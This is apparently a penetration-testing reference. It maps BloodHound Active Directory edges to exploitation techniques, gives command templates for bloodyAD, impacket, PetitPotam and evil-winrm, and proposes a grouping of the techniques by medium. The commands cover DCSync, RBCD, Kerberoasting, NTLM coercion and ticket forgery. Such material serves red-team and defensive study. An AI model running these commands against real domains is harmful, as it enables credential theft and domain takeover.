# BloodHound Edge Analysis
---

## State / Non-Exploitable Edges

### MemberOf
- Exploitable: No — this is a state edge indicating group membership.
- Treatment per node kind: N/A for all node kinds. It simply represents the fact that a principal belongs to a group.

### Contains
- Exploitable: No — structural/organizational edge.
- Treatment per node kind: Links OUs/Containers/Domains to their children. No exploitation path.

### HasSession
- Exploitable: No (not directly via bloodyAD). It indicates a user has a session on a computer. 
- You would need to compromise that computer and dump credentials (e.g., via Mimikatz, not bloodyAD).
---

## ACL-Based Exploitable Edges

### GenericWrite
-- Exploitable: Yes
-- Source node: User, Group, Computer (the principal holding the right)
-- Goal node: Varies

Treatment per node kind:

| Target Node Kind | Technique | bloodyAD Command | Requirements |
|------------------|-----------|------------------|--------------|
| User | Targeted Kerberoast (set SPN, request TGS, crack) | bloodyAD set object <targetUser> servicePrincipalName -v "fake/spn" then Rubeus/impacket kerberoast | Authenticated as source principal|
| User | Shadow Credentials (add msDS-KeyCredentialLink) | bloodyAD add uac <targetUser> -f DONT_REQ_PREAUTH or bloodyAD set object <targetUser> msDS-KeyCredentialLink -v <deviceID> (use pywhisker instead for shadow creds) | ADCS or ability to PKINIT |
| Computer | Resource-Based Constrained Delegation (write msDS-AllowedToActOnBehalfOfOtherIdentity) | bloodyAD set rbcd <targetComputer> <controlledAccount> | You need a controlled account with an SPN (machine account or user with SPN) |
| Group	| Add member to group (write member attribute) | bloodyAD add groupMember <targetGroup> <yourPrincipal> | Authenticated as source principal |
| GPO	| Modify GPO to push malicious policy | Not directly via bloodyAD — use SharpGPOAbuse or manual LDAP/SMB edits | Write access to GPO's GPC/GPT |
| OU / Container / Domain | Generally less direct; could modify attributes but the primary abuse is usually WriteDACL escalation | — | — |

### GenericAll
- Exploitable: Yes — superset of GenericWrite plus more (reset password, WriteDACL, WriteOwner, etc.)
- Source node: Any principal holding the right
- Goal node: Varies

Treatment per node kind:

| Target Node Kind | Technique	| bloodyAD Command | Requirements |
|------------------|------------|------------------|--------------|
| User | Force change password	| bloodyAD set password <targetUser> <newPassword> | Authenticated as source principal |
| User | Targeted Kerberoast | bloodyAD set object <targetUser> servicePrincipalName -v "fake/spn" | Same |
| User | Shadow Credentials | Use pywhisker / certipy | ADCS enrollment |
| Group | Add member | bloodyAD add groupMember <targetGroup> <principal> | Authenticated |
| Computer | RBCD | bloodyAD set rbcd <targetComputer> <controlledAccount> | Controlled account with SPN |
| Computer | Shadow Credentials on machine | pywhisker | ADCS |
| Domain | Grant DCSync (via WriteDACL inherent in GenericAll) | bloodyAD add dcsync <attackerPrincipal> | Authenticated with GenericAll on domain head |
| GPO | Modify GPO | SharpGPOAbuse / manual | Write to GPC/GPT |
| OU | Add ACE on OU, abuse inheritance | bloodyAD add genericAll <OU_DN> <attackerPrincipal> | — |
| Container | Similar to OU | Same pattern | — |

### WriteDacl
- Exploitable: Yes
- Source node: Any principal holding WriteDACL
- Goal node: The object whose DACL can be modified
- Strategy: Grant yourself (or a controlled principal) GenericAll on the target, then proceed as GenericAll above.

Treatment per node kind:

| Target Node Kind | Technique | bloodyAD Command | Requirements |
|------------------|-----------|------------------|--------------|
| User | Grant GenericAll on user, then reset password / kerberoast / shadow creds | bloodyAD add genericAll <targetUser_DN> <attackerPrincipal> then exploit as GenericAll→User | Authenticated |
| Group	| Grant GenericAll, then add member | bloodyAD add genericAll <targetGroup_DN> <attackerPrincipal> | Authenticated |
| Computer | Grant GenericAll, then RBCD | bloodyAD add genericAll <targetComputer_DN> <attackerPrincipal> | Authenticated |
| Domain | Grant GetChanges + GetChangesAll → DCSync | bloodyAD add dcsync <attackerPrincipal> (this does exactly that — adds the two extended rights) | Authenticated with WriteDACL on domain head |
| GPO | Grant write, then modify GPO | bloodyAD add genericAll <GPO_DN> <attackerPrincipal> | Authenticated |
| OU / Container | Grant rights, then abuse inheritance to child objects | Same pattern | — |

### WriteOwner
- Exploitable: Yes
- Source node: Any principal holding WriteOwner
- Goal node: Any AD object
- Strategy: Set yourself as owner → being owner implicitly grants WriteDACL → then proceed as WriteDACL above.

Treatment per node kind:

For all node kinds (User, Group, Computer, Domain, GPO, OU, Container):
``` Bash
# Step 1: Take ownership
bloodyAD set owner <target_DN> <attackerPrincipal>

# Step 2: Now you have WriteDACL, grant yourself GenericAll
bloodyAD add genericAll <target_DN> <attackerPrincipal>

# Step 3: Exploit as GenericAll (see above per node kind)
```

| Target Node Kind | After gaining GenericAll | Requirements |
|------------------|--------------------------|--------------|
| User | Reset password / kerberoast / shadow creds | Authenticated |
| Group | Add member | Authenticated |
| Computer | RBCD | Controlled SPN account |
| Domain | DCSync | Authenticated |
| GPO | Modify GPO | Authenticated |
| OU/Container | Abuse inheritance | Authenticated |

### Owns
- Exploitable: Yes — functionally equivalent to WriteOwner (you are already the owner).
- Treatment: Being owner → you have implicit WriteDACL → grant GenericAll → exploit.
- Same chain and commands as WriteOwner above, except you can skip step 1 (you already own it).

``` Bash
# You already own it, so directly:
bloodyAD add genericAll <target_DN> <attackerPrincipal>
# Then exploit per node kind as GenericAll
```

### ForceChangePassword
- Exploitable: Yes
- Source node: Principal holding the extended right
- Goal node: User only

``` Bash
bloodyAD set password <targetUser> <newPassword>
```
- Requirements: Authenticated as source principal. Does NOT require knowledge of the target's current password.
- Treatment per node kind: Only applicable to User objects.

### AddMember
- Exploitable: Yes
- Source node: Principal holding the right
- Goal node: Group only
``` Bash
bloodyAD add groupMember <targetGroup> <principalToAdd>
```
- Requirements: Authenticated as source principal. If the source's membership is via a group (logon principal), the source must be a member of that group.
- Treatment per node kind: Only applicable to Group objects.

---
## DCSync-Related Edges

### DCSync
- Exploitable: Yes
- Source node: Principal with both GetChanges + GetChangesAll
- Goal node: Domain
``` Bash
# Not bloodyAD — use impacket:
impacket-secretsdump <domain>/<user>:<password>@<DC_IP>
```
- Treatment: Only on Domain objects. This is the combined result of the two rights below.

### GetChanges / GetChangesAll
- Exploitable: Only when both are held together on the Domain object.
- Individually they are insufficient.
- When combined → DCSync (see above).
- Treatment per node kind: Only meaningful on Domain.
---

## Delegation Edges
### AllowedToDelegate
- Exploitable: Yes
- Source node: User or Computer with msDS-AllowedToDelegateTo set
- Goal node: Computer (the target service)
- Technique: Constrained Delegation abuse — request a service ticket via S4U2Self + S4U2Proxy
``` Bash
# impacket (not bloodyAD):
impacket-getST -spn <targetSPN> -impersonate Administrator <domain>/<sourceAccount>:<password>
```
- Requirements: Know/have credentials of the source account. If protocol transition is enabled (TRUSTED_TO_AUTH_FOR_DELEGATION), no initial service ticket needed.
- Treatment per node kind: Source is User or Computer; target is Computer.

### AllowedToAct (RBCD)
- Exploitable: Yes
- Source node: Computer whose msDS-AllowedToActOnBehalfOfOtherIdentity includes a controlled account
- Goal node: Computer (the target you want to compromise)
- Technique: Resource-Based Constrained Delegation — S4U2Self + S4U2Proxy
``` Bash
# If you need to SET it (you have write access):
bloodyAD set rbcd <targetComputer> <controlledAccount>

# Then exploit:
impacket-getST -spn cifs/<targetComputer> -impersonate Administrator <domain>/<controlledAccount$>:<password>
```
- Requirements: A controlled account with an SPN (create a machine account with bloodyAD add computer <name> <password> if MachineAccountQuota > 0).
- Treatment per node kind: Only on Computer targets.
---

## Kerberos Edges
### HasSPNConfigured (Kerberoastable)
- Exploitable: Yes
- Source node: N/A (this is a property of the target)
- Goal node: User with an SPN set
- Technique: Kerberoasting — request TGS, crack offline
``` Bash
# impacket (not bloodyAD):
impacket-GetUserSPNs <domain>/<user>:<password> -request -outputfile kerberoast.txt
```
- Requirements: Any authenticated domain account. Success depends on password strength of the target.
- Treatment per node kind: Only User objects (Computer accounts have SPNs by default but their passwords are long random strings — not crackable).
---

## Coercion Edge
### CoerceToTGT
- Exploitable: Yes
- Source node: Computer (the machine you can coerce)
- Goal node: Attacker-controlled listener
- Technique: Coerce the machine to authenticate to you (PetitPotam, PrinterBug, DFSCoerce, ShadowCoerce), relay or capture the TGT.
``` Bash
# Listener (capture TGT via unconstrained delegation or relay):
krbrelayx.py -t <target>  # or
responder -I <interface>

# Coercion:
python3 PetitPotam.py <listener_IP> <target_computer>
python3 printerbug.py <domain>/<user>:<password>@<target_computer> <listener_IP>
```
- Requirements: Network access to the target machine on the relevant RPC ports. If relaying NTLM, a relay target (e.g., ADCS HTTP enrollment endpoint). If capturing Kerberos, unconstrained delegation on your controlled machine.
- Treatment per node kind: Only Computer objects.
---
## Remote Access Edges
### CanRDPTo
- Exploitable: Yes (but not via bloodyAD — it's a lateral movement path)
- Source node: User or Group member
- Goal node: Computer
``` Bash
xfreerdp /v:<targetComputer> /u:<user> /p:<password> /d:<domain>
```
- Requirements: Valid credentials, user is in Remote Desktop Users or equivalent. If it's through a Group, you need to be a member of that group (logon principal).
- Treatment per node kind: Target is always Computer.

### CanPSRemoteTo
- Exploitable: Yes (lateral movement, not bloodyAD)
- Source node: User or Group member
- Goal node: Computer
``` Bash
evil-winrm -i <targetComputer> -u <user> -p <password>
# or PowerShell:
Enter-PSSession -ComputerName <target> -Credential <cred>
```
- Requirements: Valid credentials, user is in Remote Management Users or equivalent. WinRM enabled on target. Same group membership caveat.
- Treatment per node kind: Target is always Computer.
---

## AdminTo
- Exploitable: Yes (lateral movement, not bloodyAD)
- Source node: User or Group member
- Goal node: Computer
- Technique: Local admin → PSExec, WMIExec, SMBExec, etc.
``` Bash
impacket-psexec <domain>/<user>:<password>@<targetComputer>
impacket-wmiexec <domain>/<user>:<password>@<targetComputer>
```
- Requirements: Valid credentials, local admin membership. If via Group, must be member.
- Treatment per node kind: Target is always Computer.
---

## LAPS Edge
### ReadLAPSPassword
- Exploitable: Yes
- Source node: Principal with the right to read LAPS attributes
- Goal node: Computer
``` Bash
bloodyAD get object <targetComputer> --attr ms-mcs-AdmPwd
# or for LAPS v2:
bloodyAD get object <targetComputer> --attr msLAPS-Password
```
- Requirements: Authenticated as source principal. LAPS must be deployed on the target computer.
- Treatment per node kind: Only Computer objects.
---

## Trust Edge
### TrustedBy
- Exploitable: Conditionally — indicates a domain trust relationship.
- Source node: Domain
- Goal node: Domain
- Technique: Depends on trust direction and type:
	- Parent→Child / bidirectional: SID History injection, inter-realm TGT forgery (Golden ticket with SID history)
	- One-way outbound: Can authenticate to the trusting domain
``` Bash
# Enumerate trust key:
impacket-secretsdump <domain>/<admin>:<password>@<DC> -just-dc-user '<trustingDomain$>'
# Forge inter-realm TGT:
impacket-ticketer -nthash <trust_key> -domain-sid <sourceSID> -extra-sid <targetSID>-519 -domain <sourceDomain> Administrator
```
- Requirements: Domain admin or DCSync on one side of the trust.
- Treatment per node kind: Only Domain ↔ Domain.
---

| Edge | Exploitable | Primary Tool | Key Target Node Kinds |
|--|--|--|--|
| MemberOf | No (state) | — | Group |
| HasSession | No (intel) | Mimikatz | Computer→User |
| Contains | No (structure) | — | OU/Container/Domain |
| AdminTo | Yes (lateral) | impacket-psexec | Computer |
| GenericWrite | Yes | bloodyAD | User, Group, Computer, GPO |
| GenericAll | Yes | bloodyAD | All |
| WriteDacl | Yes | bloodyAD | All |
| WriteOwner | Yes | bloodyAD | All |
| Owns | Yes | bloodyAD | All |
|AddMember | Yes | bloodyAD | Group |
| ForceChangePassword | Yes | bloodyAD | User |
| DCSync | Yes | impacket-secretsdump | Domain |
| GetChanges+All | Yes (combined) | impacket-secretsdump | Domain |
| HasSPNConfigured | Yes | impacket-GetUserSPNs	| |
---
# Proposed Partitioning by medium of exploitation

## LDAP Techniques
These modify AD objects via LDAP writes:

| Action | Edges Covered |
|--|--|
| Set password | ForceChangePassword, GenericAll→User |
| Add group member | AddMember, GenericWrite→Group, GenericAll→Group |
| Set SPN (for kerberoast) | GenericWrite→User, GenericAll→User |
| Write msDS-AllowedToActOnBehalfOfOtherIdentity (RBCD)	| GenericWrite→Computer, GenericAll→Computer |
| Write msDS-KeyCredentialLink (Shadow Credentials) | GenericWrite→User/Computer, GenericAll→User/Computer |
| Modify DACL | WriteDacl, GenericAll (implicit) |
| Change owner | WriteOwner, Owns→WriteDacl chain |
| Grant DCSync rights | WriteDacl→Domain, GenericAll→Domain |
| Read LAPS password | ReadLAPSPassword |
| Add computer account | (prerequisite for RBCD) |
| Modify GPO GPC attributes | GenericWrite→GPO, GenericAll→GPO |

- Tool: bloodyAD, ldapmodify, PowerView

## Kerberos Techniques
These abuse Kerberos protocol mechanics:

| Action | Edges Covered |
|--|--|
| Kerberoasting (request TGS, crack) | HasSPNConfigured, after setting SPN via LDAP |
| AS-REP Roasting | (not in your edges, but related) |
| S4U2Self + S4U2Proxy (Constrained Delegation) | AllowedToDelegate |
| S4U2Self + S4U2Proxy (RBCD)	| AllowedToAct (after LDAP setup) |
| DCSync (DRS replication) | DCSync, GetChanges+GetChangesAll |
| Inter-realm TGT forgery | TrustedBy |
| Golden/Silver ticket |(post-exploitation) |

- Tool: bloodyAD, ldapmodify, PowerView

## Coercion / Relay Techniques (Network-level)
These abuse authentication coercion and relaying:

| Action | Edges Covered |
|--|--|
| Coerce NTLM/Kerberos auth | CoerceToTGT |
| NTLM relay to LDAP/HTTP/SMB | CoerceToTGT (relay variant) |
| Capture Kerberos TGT (unconstrained deleg) | CoerceToTGT (capture variant) |

- Tool: PetitPotam, PrinterBug, DFSCoerce, Coercer, ntlmrelayx, krbrelayx, Responder

## Execution / Lateral Movement Techniques
These give you a shell or code execution on a remote machine:

| Action | Edges Covered |
|--|--|
| PSExec / WMIExec / SMBExec | AdminTo |
| RDP | CanRDPTo |
| WinRM / PS Remoting | CanPSRemoteTo |
| GPO abuse (push scheduled task/script) | GenericWrite→GPO, GenericAll→GPO (the SMB write part) |

- Tool: impacket-psexec/wmiexec, evil-winrm, xfreerdp, SharpGPOAbuse

## Credential Techniques ← This is where your partitioning gets tricky
This isn't really a separate category — it's more of a cross-cutting concern. Credentials are either:
- Obtained via another technique (kerberoast crack, LAPS read, DCSync, session dump)
- Used as input to all other categories
If you insist on keeping it, it would cover:

| Action | Edges Covered |
|--|--|
| Crack kerberoast/AS-REP hash | Output of Kerberos technique |
| Dump LAPS password | Output of LDAP technique |
| Dump credentials from session | HasSession → Mimikatz (exec technique) |
| DCSync dump | Could be here or Kerberos |

```
GenericWrite → Computer:
  Step 1: LDAP (write RBCD attribute)      ← ldap_technique
  Step 2: Kerberos (S4U2Self + S4U2Proxy)  ← kerberos_technique
  Step 3: Exec (psexec with ticket)        ← exec_technique

WriteDacl → Domain:
  Step 1: LDAP (grant DCSync ACE)          ← ldap_technique
  Step 2: Kerberos (DCSync)                ← kerberos_technique
```